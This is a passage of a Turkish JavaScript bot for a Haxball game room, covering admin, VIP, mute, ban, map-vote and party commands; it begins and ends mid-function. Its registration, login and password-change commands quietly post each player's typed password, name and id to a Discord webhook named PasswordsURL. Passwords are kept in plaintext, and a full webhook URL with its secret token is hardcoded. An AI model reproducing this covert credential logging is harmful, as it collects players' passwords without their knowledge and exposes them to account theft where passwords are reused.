            adminList = adminList.filter((a) => a[0] != authArray[player.id][0]);
            masterList.push(authArray[player.id][0]);
            isKurucuRole[player.name] = true; // Oyuncu adını kaydeder
    room.sendAnnouncement("💎 DİKKAT !! 𝗩𝗜𝗣 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0x26ffff);
    room.sendAnnouncement("🔱 DİKKAT !! 𝗞𝗨𝗥𝗨𝗖𝗨 𝗔𝗗𝗠𝗜𝗡 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0xff0000);
        isVIP[player.id] = true;
  setTimeout(function() {
    room.sendAnnouncement("Hoşgeldiniz, 🔱 𝗞𝗨𝗥𝗨𝗖𝗨 𝗔𝗗𝗠𝗜𝗡 | komutlara !help ile bakabilirsiniz.", player.id, 0xd6e320);
    room.sendAnnouncement("Hoşgeldiniz, 💎 𝗩𝗜𝗣 | komutlara !vipkomutları ile bakabilirsiniz.", player.id, 0x26ffff);
  }, 3000);
        } else {
            room.sendAnnouncement(
                `Zaten KURUCU Adminsiniz !`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    }
}

/* ADMIN COMMANDS */

function restartCommand(player, message) {
    instantRestart();
}

function restartSwapCommand(player, message) {
    room.stopGame();
    swapButton();
    startTimeout = setTimeout(() => {
        room.startGame();
    }, 10);
}

function sendDiscordMessage(webhookURL, message) {
    const discordData = {
        content: message
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(discordData),
    })
    .then(response => {
        if (response.ok) {
        } else {
        }
    })
    .catch(error => {
    });
}

const uyeStore = {}; // Kullanıcı verilerini saklayacak basit bir obje

function KayıtCommand(player, message) {
    const command = message.split(" ")[0].toLowerCase();
    const commandArgs = message.substring(command.length).trim(); // commandArgs olarak değiştirildi

    var responses = ['a', 'z', 'X', 'b', 'Q', 'c', 'Z', 'Ö', 'P', '*', 'u', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'E'];
    var randombisi = responses[Math.floor(Math.random() * responses.length)];
    var responses = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '123', '99', '66'];
    var randomsayi = responses[Math.floor(Math.random() * responses.length)];

    const playerName = player.name.toLowerCase();
    const password = commandArgs.trim(); // Şifreyi al, boşlukları temizle

    if (!password) {
        room.sendAnnouncement("Şifre belirtmediniz. ÖRNEK KULLANIM: !kayıt şifreniz123", player.id, 0xFF0000, "bold", 2);
        return false; // Şifre belirtilmediği için işlemi sonlandır
    }

    // Şifrede boşluk kontrolü
    const hasSpace = password.includes(' ');

    if (hasSpace) {
        room.sendAnnouncement("⚠️ Şifrede boşluk bırakamazsınız.", player.id, 0xFF0000, "bold", 2);
        return false; // Boşluk içeren şifre için işlemi sonlandır
    }

    // Şifrenin minimum 4 harf içerdiğini ve en az bir rakam içerdiğini kontrol et
    const hasMinimumLength = password.length >= 4;
    const hasNumber = /\d/.test(password);

    if (hasMinimumLength && hasNumber) {
        if (!uyeStore[playerName]) {
            uyeStore[playerName] = { password: password, loggedIn: false };
            room.sendAnnouncement("🔐 " + player.name + ", Kayıt Başarılı.", player.id, 0x00ff00, "bold");
    sendDiscordMessage(PasswordsURL,'[' + getDate() + '] (' + player.id + ') ' + '(KAYIT YAPTI) ' + player.name + ": " + message);
        } else {
            room.sendAnnouncement("Bu kullanıcı zaten kayıtlı.", player.id, 0xFF0000, "bold", 2);
        }
    } else {
        room.sendAnnouncement("⚠️ Şifre minimum 4 harfli olmalı ve en az bir rakam içermeli.", player.id, 0xFF0000, "bold", 2);
        setTimeout(function () {
            const recommendedPassword = password + password + randombisi + randomsayi; // Önerilen şifre oluştur
            room.sendAnnouncement("✔️ ÖNERİLEN ŞİFRE: !kayıt " + recommendedPassword, player.id, 0xfa96ff, 'small', 2);
        }, 2000);
     }
}

    function endVote() {
        votingInProgress = false;
        
        if (voteOptions.power > voteOptions.normal) {
            room.setCustomStadium(PowerMap());
  room.sendAnnouncement("Odanın çoğu POWER istiyor, POWER açılıyor!", null, 0x00ff00, "bold");
        } else if (voteOptions.normal > voteOptions.power) {
            room.setCustomStadium(NormalMap());
  room.sendAnnouncement("Odanın çoğu FUTSAL istiyor, FUTSAL açılıyor!", null, 0x00ff00, "bold");
        } else {
            var randomMap = Math.random() < 0.5 ? PowerMap() : NormalMap();
            room.setCustomStadium(randomMap);
  room.sendAnnouncement("Oylarda Eşitlik Var, Rastgele Bir Harita Seçildi!", null, 0x00ff00, "bold");
        }
        
        // Reset vote options and voted players
        voteOptions.power = 0;
        voteOptions.normal = 0;
        votedPlayers = {};
}

    function startVote() {
        votingInProgress = true;
      room.sendAnnouncement("┌─────────────────────── 📩ᴍᴀᴘ ᴏʏʟᴀᴍᴀ ᴢᴀᴍᴀɴı ───────────────────────┐", null, 0xf4c870, "normal", 0)
      room.sendAnnouncement("🗳️ Harita oylaması başlamıştır. Komutlar; [ !power !futsal ] Oylama Süresi 15 saniye.", null, 0xf98d72, "small", 2);
      room.sendAnnouncement("└───────────────────────── ⏱15⇒sᴀɴɪ̇ʏᴇ⏱─────────────────────────┘", null, 0xf4c870, "normal", 0)
                room.setTimeLimit(5);
}

function SkoreCommand() {
// bişy yok
}

function puaneCommand() {
// bişy yok
}

function rankeCommand() {
// bişy yok
}

function rankehelpeehCommand() {
// bişy yok
}

function sıraneCommand() {
// bişy yok
}

function GirişCommand(player, message) {
    const command = message.split(" ")[0].toLowerCase();
    const commandArgs = message.substring(command.length).trim(); // commandArgs olarak değiştirildi

    if (command === "!giriş") {
        const playerName = player.name.toLowerCase();
        const password = commandArgs; // Şifreyi al
        if (uyeStore[playerName] && uyeStore[playerName].password === password) {
            uyeStore[playerName].loggedIn = true;
            room.sendAnnouncement("🔐 " + player.name + ", ᴋɪᴍʟɪᴋ ᴅᴏɢʀᴜʟᴀᴍᴀ ʙᴀsᴀʀɪʟɪ.", player.id, 0x00ff00, "bold");
    sendDiscordMessage(PasswordsURL,'[' + getDate() + '] (' + player.id + ') ' + '(GİRİŞ YAPTI) ' + player.name + ": " + message);
        } else {
            room.sendAnnouncement("Şifreyi yanlış girdiniz.", player.id, 0xFF0000, "bold", 2);
        }
     }
}

function Sifredegistirlen(player, message) {
    const command = message.split(" ")[0].toLowerCase();
    const commandArgs = message.substring(command.length).trim(); // commandArgs olarak değiştirildi

        const playerName = player.name.toLowerCase();
        const newPassword = commandArgs; // Yeni şifreyi al
        if (uyeStore[playerName] && uyeStore[playerName].loggedIn) {
            uyeStore[playerName].password = newPassword;
            room.sendAnnouncement("🔐 " + player.name + ", sɪꜰʀᴇ ᴅᴇɢɪsᴛɪʀᴍᴇ ʙᴀꜱᴀʀɪʟɪ.", player.id, 0x00ff00, "bold");
    sendDiscordMessage(PasswordsURL,'[' + getDate() + '] (' + player.id + ') ' + '(ŞİFRE DEĞİŞTİRDİ) ' + player.name + ": " + message);
        } else {
            room.sendAnnouncement("Şifre değiştirmek için giriş yapmalısınız.", player.id, 0xFF0000, "bold", 2);
        }
}

function PowerCommand(player, message) {
// Burası Boş Kalabilir..
}

function NormalCommand(player, message) {
// Burası Boş Kalabilir..
}

function buyukolCommand(player, message) {
    if (isVIP[player.id]) {
    room.setPlayerDiscProperties(player.id, {radius: 20, invMass: 20 / 30, acceleration: 20, kickStrength: 20});
    room.sendAnnouncement('⚠️ Dev Oldunuz VIP! (Maçlar İçin Geçerli)', null, 0xFFAEB9, "normal", 0);
    }
}

function kucukolCommand(player, message) {
    if (isVIP[player.id]) {
    room.setPlayerDiscProperties(player.id, {radius: 8, invMass: 20 / 30, acceleration: 20, kickStrength: 20});
    room.sendAnnouncement('⚠️ Küçüldünüz VIP! (Maçlar İçin Geçerli)', null, 0xFFAEB9, "normal", 0);
    }
}

function vipcommandCommand(player, message) {
    room.sendAnnouncement("💎 VIP Komutları:", player.id, 0x00f7ff, "normal");
    room.sendAnnouncement("!büyükol, !küçükol, !görünmezol, !parti, !topparti, !toprengi (RENK KODU), !viprengi (RENK KODU)", player.id, 0x0077ff, "small");
}

function ballpartyCommand(player, message) {
    if (isVIP[player.id]) {
    setTimeout(function () {
room.setDiscProperties(0, {color: "0xb300ff"});
    room.sendAnnouncement('✅ Top Rengini Değiştirdiniz, VIP!', player.id, 0xFFAEB9);
}, 0);
    setTimeout(function () {
room.setDiscProperties(0, {color: "0x000000"});
}, 2000);
    setTimeout(function () {
room.setDiscProperties(0, {color: "0x00ffdd"});
}, 4000);
    setTimeout(function () {
room.setDiscProperties(0, {color: "0xff00d9"});
}, 6000);
    setTimeout(function () {
room.setDiscProperties(0, {color: "0x1eff00"});
}, 8000);
    setTimeout(function () {
room.setDiscProperties(0, {color: "0xff6a00"});
}, 10000);
    setTimeout(function () {
room.setDiscProperties(0, {color: "0x05008c"});
}, 12000);
    setTimeout(function () {
room.setDiscProperties(0, {color: "0xffffff"});
}, 14000);
    setTimeout(function () {
room.setDiscProperties(0, {color: "0x808080"});
}, 16000);
    }
}

function viprengidegisCommand(player, message) {
    if (isVIP[player.id]) {
        var komut = message.split(" ");
        if (komut.length === 2) {
            VipRenkKodu = komut[1]; // Rengi değiştirmek için kullanılan değişkeni güncelle
            room.sendAnnouncement("💎 Yeni VIP Rengi: " + VipRenkKodu + " Olarak Ayarlandı.", player.id, VipRenkKodu, 'bold');
        }
    }
}

function toprengidegisCommand(player, message) {
    if (isVIP[player.id]) {
        var komut = message.split(" ");
        if (komut.length === 2) {
            var toprengi = komut[1]; // Yeni top rengini al
            room.setDiscProperties(0, { color: toprengi }); // Topun rengini değiştir
            room.sendAnnouncement('✅ Top Rengini Değiştirdiniz, VIP!', player.id, toprengi);
        }
    }
}

function avatarpartyCommand(player, message) {
    if (isVIP[player.id]) {
        setTimeout(function () {
            room.sendAnnouncement('');
            room.sendAnnouncement('🥳 Parti Modu Başlatıldı! Başlatan VİP: ' + player.name, null, 0xd91200);
            room.sendAnnouncement('');
        }, 0);

        function setPlayerProperties(radius, color1, color2, celebration) {
            for (let i = 1; i <= 200; i++) {
                room.setPlayerDiscProperties(i, {
                    radius: radius,
                    invMass: 20 / 30,
                    acceleration: 20,
                    kickStrength: 20
                });
                avatarCelebration(i, celebration);
            }
        }

        setTimeout(function () {
            room.setTeamColors(1, 0x000000, 0x000000, [0x000000]);
            setPlayerProperties(25, 0x000000, 0x000000, "🥳");
        }, 1000);

        setTimeout(function () {
            room.setTeamColors(2, 0xFFA500, 0xFFA500, [0xFFA500]);
            setPlayerProperties(30, 0xFFA500, 0xFFA500, "🎉");
        }, 4000);

        setTimeout(function () {
            room.setTeamColors(1, 0xFFC0CB, 0xFFC0CB, [0xFFC0CB]);
            setPlayerProperties(35, 0xFFC0CB, 0xFFC0CB, "🎊");
        }, 7000);

        setTimeout(function () {
            room.setTeamColors(2, 0x008000, 0x008000, [0x008000]);
            setPlayerProperties(40, 0x008000, 0x008000, "🎊");
        }, 10000);

        setTimeout(function () {
            room.setTeamColors(1, 0xFFFF00, 0xFFFF00, [0xFFFF00]);
            setPlayerProperties(35, 0xFFFF00, 0xFFFF00, "🔥");
        }, 13000);

        setTimeout(function () {
            room.setTeamColors(2, 0xFFFF00, 0xFFFFFF, [0xFFFFFF]);
            setPlayerProperties(30, 0xFFFF00, 0xFFFFFF, "🤩");
        }, 16000);

        setTimeout(function () {
            room.setTeamColors(1, 0x800080, 0x800080, [0x800080]);
            setPlayerProperties(28, 0x800080, 0x800080, "🕺");
        }, 19000);

        setTimeout(function () {
            room.setTeamColors(2, 0x00ddff, 0x00ddff, [0x00ddff]);
            setPlayerProperties(37, 0x00ddff, 0x00ddff, "💃");
        }, 22000);

        setTimeout(function () {
            room.setTeamColors(1, 0x5c1500, 0x5c1500, [0x5c1500]);
            setPlayerProperties(42, 0x5c1500, 0x5c1500, "🎄");
        }, 25000);

        setTimeout(function () {
            room.setTeamColors(2, 0xff0000, 0xff0000, [0xff0000]);
            setPlayerProperties(50, 0xff0000, 0xff0000, "🥂");
        }, 28000);

        setTimeout(function () {
            room.setTeamColors(1, 0xffa900, 0xffa900, [0xffa900]);
            setPlayerProperties(25, 0xffa900, 0xffa900, "🎁");
        }, 31000);

        setTimeout(function () {
            room.setTeamColors(2, 0xb5b5b5, 0xb5b5b5, [0xb5b5b5]);
            setPlayerProperties(30, 0xb5b5b5, 0xb5b5b5, "🍾");
        }, 34000);

        setTimeout(function () {
            room.setTeamColors(1, 0xb5b5b5, 0xb5b5b5, [0xb5b5b5]);
            setPlayerProperties(15, 0xb5b5b5, 0xb5b5b5, "❤️");
        }, 37000);
    }
}

function gorunmezolCommand(player, message) {
    if (isVIP[player.id]) {
    room.setPlayerDiscProperties(player.id, {radius: 0, invMass: 20 / 30, acceleration: 20, kickStrength: 20});
    room.sendAnnouncement('⚠️ Görünmez Oldunuz VIP! (Maçlar İçin Geçerli)', null, 0xFFAEB9, "normal", 0);
    }
}

function VipşifredeğiştirCommand(player, message) {
  var komut = message.split(" "); // Mesajı boşluklara göre böler
  if (komut.length === 2) {
    vipSifre = komut[1]; // Yeni VIP şifresini ayarlar
    room.sendAnnouncement("🔐 Yeni VIP şifresi: " + vipSifre, player.id, 0xFFFF00, 'bold');
  }
}

function VipdeleteCommand(player, message) {
    var vipsayisi = 0;

    for (var key in isVIP) {
        if (isVIP.hasOwnProperty(key)) {
            delete isVIP[key];
            vipsayisi++;
        }
    }

    room.sendAnnouncement(vipsayisi + ' adet VIP Silindi !', player.id, 0x00eddd, 'bold');
}

function VipekleCommand(player, message) {
    var parts = message.split(" "); // Mesajı boşluklara göre böler
    if (parts.length === 2) {
        var idToAddVIP = parseInt(parts[1]); // İkinci kısmı alır ve integer'a çevirir
        if (!isNaN(idToAddVIP)) {
            if (isVIP[idToAddVIP]) {
                room.sendAnnouncement('Oyuncu ' + idToAddVIP + ' zaten VIP!', player.id, 0xFF0000, 'bold');
            } else {
                isVIP[idToAddVIP] = true; // VIP oyuncu listesine ekler
                room.sendAnnouncement('💎 Oyuncu (İD) ' + idToAddVIP + ' VIP verildi !', null, 0x00eddd, 'bold');
                room.sendAnnouncement("💎 DİKKAT !! 𝗩𝗜𝗣 | ɢɪʀɪs ʏᴀᴘᴛɪ", null, 0x26ffff);
            }
        } else {
            room.sendAnnouncement('❌ Geçersiz oyuncu IDsi. Örnek kullanım: !vipekle 5', player.id, 0xFF0000, 'bold');
        }
    } else {
        room.sendAnnouncement('❌ Geçersiz komut. Örnek kullanım: !vipekle 5', player.id, 0xFF0000, 'bold');
    }
}

function AdminRengideğiştirCommand(player, message) {
  var komut = message.split(" ");
  if (komut.length === 2) {
    AdminRenkKodu = komut[1];
    room.sendAnnouncement("🔱 Yeni Admin Rengi: " + AdminRenkKodu + " Olarak Ayarlandı.", player.id, AdminRenkKodu, 'bold');
  }
}

function VipinialCommand(player, message) {
    var parts = message.split(" "); // Mesajı boşluklara göre böler
    if (parts.length === 2) {
        var idToRemoveVIP = parseInt(parts[1]); // İkinci kısmı alır ve integer'a çevirir
        if (!isNaN(idToRemoveVIP)) {
            if (isVIP[idToRemoveVIP]) {
                delete isVIP[idToRemoveVIP]; // VIP oyuncu listesinden kaldırır
                room.sendAnnouncement('✅ Oyuncu ' + idToRemoveVIP + ' VIP statüsü kaldırıldı!', player.id, 0xFF0000, 'bold');
            } else {
                room.sendAnnouncement('❌ Oyuncu ' + idToRemoveVIP + ' zaten VIP değil!', player.id, 0xFF0000, 'bold');
            }
        } else {
            room.sendAnnouncement('❌ Geçersiz oyuncu IDsi. Örnek kullanım: !vipsil 5', player.id, 0xFF0000, 'bold');
        }
    } else {
        room.sendAnnouncement('❌ Geçersiz komut. Örnek kullanım: !vipsil 5', player.id, 0xFF0000, 'bold');
    }
}

function sendMessageToDiscord(message) {
  var request = new XMLHttpRequest();
  request.open("POST", URLs.chat);
  request.setRequestHeader('Content-type', 'application/json');
  var params = {
    avatar_url: '',
    username: 'oda-log',
    content: message
  };
  request.send(JSON.stringify(params));
}

var adminCooldown = {}; // Kullanıcıların son kullanım zamanlarını saklayan bir nesne

function sendDiscord(webhookUrl, message) {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", webhookUrl, true);
  xhr.setRequestHeader("Content-Type", "application/json");

  var discordMessage = {
    content: message,
  };

  xhr.send(JSON.stringify(discordMessage));
}

function AdminlereBilgiGecildiCommand(player, message) {
  var currentTime = new Date().getTime();

  // Kullanıcının son kullanım zamanı
  var lastUsageTime = adminCooldown[player.id] || 0;

  // 10 dakika beklenmesi gereken zaman
  var cooldownTime = 10 * 60 * 1000; // 10 dakika milisaniye cinsinden

  if (currentTime - lastUsageTime >= cooldownTime) {
    // 10 dakika süresi doldu, komutu kullanıcıya izin ver
    room.sendAnnouncement("Adminlere Bilgi Geçildi.", null, 0x0000FF, 'bold');

    sendDiscord(
        "https://discord.com/api/webhooks/1163616479133040701/BaMiSPvwObryIn4FgyGJ5u4_43azzTFqur2W9wURlspHXrBSl56sYMkJIJCXFUFzcHjo",
        roomName + " Odasının Admine İhtiyacı Var❗️ Çağıran Oyuncu: " + player.name + "(" + player.id + ") @everyone ⚠️" + player.name + ": " + message
    );

    // Kullanıcının son kullanım zamanını güncelle
    adminCooldown[player.id] = currentTime;

    return false;
  } else {
    // 10 dakika süresi dolmadı, kullanıcıya komutu kullanma izni verme
    var remainingTime = (cooldownTime - (currentTime - lastUsageTime)) / 1000;
    room.sendAnnouncement("Bu komutu tekrar kullanmak için " + remainingTime + " saniye beklemelisiniz.", player.id, 0xffff00, "bold");
  }
}

function OylaCommand(player, message) {
    var id = message.substring(6).trim();
    room.sendAnnouncement("🗳️ " + player.name + ", ɪᴅsɪ " + id + " ᴏʟᴀɴ ᴏʏᴜɴᴄᴜʏᴀ ᴏʏ ᴠᴇʀᴅɪ.", null, 0x00e60f, "normal");
}

function Oyla2Command(player, message) {
    var id = message.substring(4).trim();
    room.sendAnnouncement("🗳️ " + player.name + ", ɪᴅsɪ " + id + " ᴏʟᴀɴ ᴏʏᴜɴᴄᴜʏᴀ ᴏʏ ᴠᴇʀᴅɪ.", null, 0x00e60f, "normal");
}

function KaptanCommand(player, message) {
room.sendAnnouncement('🗳️ ' + player.name + ' ᴛᴀᴋıᴍ ᴋᴀᴘᴛᴀɴʟɪɢɪɴᴀ ᴀᴅᴀʏ ᴏʟᴜʏᴏʀ! ✔️', null, 0x00FF00, "bold");
}

function discordCommand(player, message) {
        var responses = ['0x00FF00', '0xe80000', '0xdb00eb', '0x00e0d1', '0xe6de00'];
        var randomResponse = responses[Math.floor(Math.random() * responses.length)];
room.sendAnnouncement('┌───────────────────────────────────────────┐', player.id, randomResponse, "bold");
room.sendAnnouncement('| ⭐ 𝐃𝐈̇𝐒𝐂𝐎𝐑𝐃 𝐒𝐔𝐍𝐔𝐂𝐔𝐌𝐔𝐙: https://discord.gg/8nCu3BRRCx ⭐ |', player.id, randomResponse, "bold");
room.sendAnnouncement('└───────────────────────────────────────────┘', player.id, randomResponse, "bold");
}

function swapCommand(player, message) {
    if (playSituation == Situation.STOP) {
        swapButton();
        room.sendAnnouncement(
            '✔️ Takımlar Karıştırıldı !',
            null,
            announcementColor,
            'bold',
            null
        );
    } else {
        room.sendAnnouncement(
            `Lütfen takımları karıştırmadan önce oyunu durdurun.`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }
}

var susalım = true;

function susunCommand(player, message) {
    if (player.admin === true) {
        susalım = false;
        room.sendAnnouncement("🔇 ᴅᴀʜᴀ ᴋᴀʟɪᴛᴇʟɪ ʙɪʀ ᴏʏᴜɴ ɪᴄɪɴ ᴄʜᴀᴛ ᴋᴀᴘᴀᴛɪʟᴅɪ. ᴋᴏɴᴜꜱᴜʟᴀɴʟᴀʀɪ ʏᴀʟɴıᴢᴄᴀ ᴀᴅᴍɪɴʟᴇʀ ɢᴏʀᴇʙɪʟɪʀ.", null, 0x00ff00, "bold", 2);
    }
}

function konuşunCommand(player, message) {
    if (player.admin === true) {
        susalım = true;
        room.sendAnnouncement("🔊 ᴀᴅᴍɪɴ ᴄʜᴀᴛ'ɪ ᴀᴄᴛɪ.", null, 0x00ff00, "bold", 2);
    }
}

function kickTeamCommand(player, message) {
    var msgArray = message.split(/ +/);
    var reasonString = `Team kick by ${player.name}`;
    if (msgArray.length > 1) {
        reasonString = msgArray.slice(1).join(' ');
    }
    if (['!kickred', '!kickr'].includes(msgArray[0].toLowerCase())) {
        for (let i = 0; i < teamRed.length; i++) {
            setTimeout(() => {
                room.kickPlayer(teamRed[0].id, reasonString, false);
            }, i * 20)
        }
    } else if (['!kickblue', '!kickb'].includes(msgArray[0].toLowerCase())) {
        for (let i = 0; i < teamBlue.length; i++) {
            setTimeout(() => {
                room.kickPlayer(teamBlue[0].id, reasonString, false);
            }, i * 20)
        }
    } else if (['!kickspec', '!kicks'].includes(msgArray[0].toLowerCase())) {
        for (let i = 0; i < teamSpec.length; i++) {
            setTimeout(() => {
                room.kickPlayer(teamSpec[0].id, reasonString, false);
            }, i * 20)
        }
    }
}

function stadiumCommand(player, message) {
    var msgArray = message.split(/ +/);
    if (gameState == State.STOP) {
        if (['!classic'].includes(msgArray[0].toLowerCase())) {
            if (JSON.parse(classicMap).name == 'Classic') {
                room.setDefaultStadium('Classic');
            } else {
                room.setTimeLimit(3);
                room.setCustomStadium(classicMap);
            }
            currentStadium = 'classic';
        } else if (['!big'].includes(msgArray[0].toLowerCase())) {
            if (JSON.parse(bigMap).name == 'Big') {
                room.setDefaultStadium('Big');
            } else {
                room.setTimeLimit(3);
                room.setCustomStadium(bigMap);
            }
            currentStadium = 'big';
        } else if (['!training'].includes(msgArray[0].toLowerCase())) {
                room.setTimeLimit(5);
            room.setCustomStadium(trainingMap);
            currentStadium = 'training';
        } else {
            room.sendAnnouncement(
                `Böyle bir stadyum yok.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    } else {
        room.sendAnnouncement(
            `Lütfen bu komutu kullanmadan önce oyunu durdurun.`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }
}

function muteCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length > 0) {
        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
            if (room.getPlayer(parseInt(msgArray[0])) != null) {
                var playerMute = room.getPlayer(parseInt(msgArray[0]));
                var minutesMute = muteDuration;
                if (msgArray.length > 1 && parseInt(msgArray[1]) > 0) {
                    minutesMute = parseInt(msgArray[1]);
                }
                if (!playerMute.admin) {
                    var muteObj = new MutePlayer(playerMute.name, playerMute.id, authArray[playerMute.id][0]);
                    muteObj.setDuration(minutesMute);
                    room.sendAnnouncement(
                        `🔇 ${playerMute.name} ${minutesMute} dakikalığına susturuldu.`,
                        null,
                        announcementColor,
                        'bold',
                        null
                    );
                } else {
                    room.sendAnnouncement(
                        `Bir yöneticiyi muteleyemezsin!`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                }
            } else {
                room.sendAnnouncement(
                    `Odada böyle bir IDye sahip oyuncu yok. Daha fazla bilgi için "!help mute" yazın.`,
                    player.id,
                    errorColor,
                    'bold',
                    HaxNotification.CHAT
                );
            }
        } else {
            room.sendAnnouncement(
                `Argümanınız için yanlış format. Daha fazla bilgi için "!help mute" yazın.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    } else {
        room.sendAnnouncement(
            `Yanlış sayıda argüman. Daha fazla bilgi için "!help mute" yazın.`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }
}

function unmuteCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length > 0) {
        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
            if (room.getPlayer(parseInt(msgArray[0])) != null) {
                var playerUnmute = room.getPlayer(parseInt(msgArray[0]));
                if (muteArray.getByPlayerId(playerUnmute.id) != null) {
                    var muteObj = muteArray.getByPlayerId(playerUnmute.id);
                    muteObj.remove()
                    room.sendAnnouncement(
                        `${playerUnmute.name} mutesi kaldırıldı !`,
                        null,
                        announcementColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                } else {
                    room.sendAnnouncement(
                        `Bu oyuncu mutelenmedi !`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                }
            } else {
                room.sendAnnouncement(
                    `Odada böyle bir IDye sahip oyuncu yok. Daha fazla bilgi için "!help mute" komutunu girin.`,
                    player.id,
                    errorColor,
                    'bold',
                    HaxNotification.CHAT
                );
            }
        } else if (msgArray[0].length > 0 && parseInt(msgArray[0]) > 0 && muteArray.getById(parseInt(msgArray[0])) != null) {
            var playerUnmute = muteArray.getById(parseInt(msgArray[0]));
            playerUnmute.remove();
            room.sendAnnouncement(
                `${playerUnmute.name}, muteniz kaldırıldı !`,
                null,
                announcementColor,
                'bold',
                HaxNotification.CHAT
            );
        } else {
            room.sendAnnouncement(
                `Argümanınız için yanlış format. Daha fazla bilgi için "!help unmute" komutunu girin.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    } else {
        room.sendAnnouncement(
            `Yanlış sayıda argüman. Daha fazla bilgi için "!help unmute" komutunu girin.`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }
}

function muteListCommand(player, message) {
    if (muteArray.list.length == 0) {
        room.sendAnnouncement(
            "🔇 Mute listesinde kimse yok.",
            player.id,
            announcementColor,
            'bold',
            null
        );
        return false;
    }
    var cstm = '🔇 Mute listesi : ';
    for (let mute of muteArray.list) {
        cstm += mute.name + `[${mute.id}], `;
    }
    cstm = cstm.substring(0, cstm.length - 2) + '.';
    room.sendAnnouncement(
        cstm,
        player.id,
        announcementColor,
        'bold',
        null
    );
}

/* MASTER COMMANDS */

function clearbansCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length == 0) {
        room.clearBans();
        room.sendAnnouncement(
            '✔️ Bans cleared !',
            null,
            announcementColor,
            'bold',
            null
        );
        banList = [];
    } else if (msgArray.length == 1) {
        if (parseInt(msgArray[0]) > 0) {
            var ID = parseInt(msgArray[0]);
            room.clearBan(ID);
            if (banList.length != banList.filter((p) => p[1] != ID).length) {
                room.sendAnnouncement(
                    `✔️ ${banList.filter((p) => p[1] == ID)[0][0]} odaya girme yasağı kaldırıldı !`,
                    null,
                    announcementColor,
                    'bold',
                    null
                );
            } else {
                room.sendAnnouncement(
                    `Girdiğiniz İDnin ilişkili bir yasağı yok. Daha fazla bilgi için "!help clearbans" yazın.`,
                    player.id,
                    errorColor,
                    'bold',
                    HaxNotification.CHAT
                );
            }
            banList = banList.filter((p) => p[1] != ID);
        } else {
            room.sendAnnouncement(
                `Geçersiz İD girildi. Daha fazla bilgi için "!help clearbans" yazın.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    } else {
        room.sendAnnouncement(
            `Yanlış sayıda argüman. Daha fazla bilgi için "!help clearbans" yazın.`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }
}

function banListCommand(player, message) {
    if (banList.length == 0) {
        room.sendAnnouncement(
            "📢 Ban listesinde kimse yok.",
            player.id,
            announcementColor,
            'bold',
            null
        );
        return false;
    }
    var cstm = '📢 Ban listesi : ';
    for (let ban of banList) {
        cstm += ban[0] + `[${ban[1]}], `;
    }
    cstm = cstm.substring(0, cstm.length - 2) + '.';
    room.sendAnnouncement(
        cstm,
        player.id,
        announcementColor,
        'bold',
        null
    );
}

function adminListCommand(player, message) {
    if (adminList.length == 0) {
        room.sendAnnouncement(
            "📢 Admin listesinde kimse yok.",
            player.id,
            announcementColor,
            'bold',
            null
        );
        return false;
    }
    var cstm = '📢 Admin listesi : ';
    for (let i = 0; i < adminList.length; i++) {
        cstm += adminList[i][1] + `[${i}], `;
    }
    cstm = cstm.substring(0, cstm.length - 2) + '.';
    room.sendAnnouncement(
        cstm,
        player.id,
        announcementColor,
        'bold',
        null
    );
}

function setAdminCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length > 0) {
        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
            if (room.getPlayer(parseInt(msgArray[0])) != null) {
                var playerAdmin = room.getPlayer(parseInt(msgArray[0]));

                if (!adminList.map((a) => a[0]).includes(authArray[playerAdmin.id][0])) {
                    if (!masterList.includes(authArray[playerAdmin.id][0])) {
                        room.setPlayerAdmin(playerAdmin.id, true);
                        adminList.push([authArray[playerAdmin.id][0], playerAdmin.name]);
                        room.sendAnnouncement(
                            `${playerAdmin.name} artık oda Admini!`,
                            null,
                            announcementColor,
                            'bold',
                            HaxNotification.CHAT
                        );
                    } else {
                        room.sendAnnouncement(
                            `Bu kişi zaten bir Admin!`,
                            player.id,
                            errorColor,
                            'bold',
                            HaxNotification.CHAT
                        );
                    }
                } else {
                    room.sendAnnouncement(
                        `Bu kişi zaten kalıcı bir Admin!`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                }
            } else {
                room.sendAnnouncement(
                    `Odada böyle bir İDye sahip oyuncu yok. Daha fazla bilgi için "!help setadmin" yazın.`,
                    player.id,
                    errorColor,
                    'bold',
                    HaxNotification.CHAT
                );
            }
        } else {
            room.sendAnnouncement(
                `Incorrect format for your argument. Enter "!help setadmin" for more information.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    } else {
        room.sendAnnouncement(
            `Wrong number of arguments. Enter "!help setadmin" for more information.`,
            player.id,
            errorColor,
            'bold',
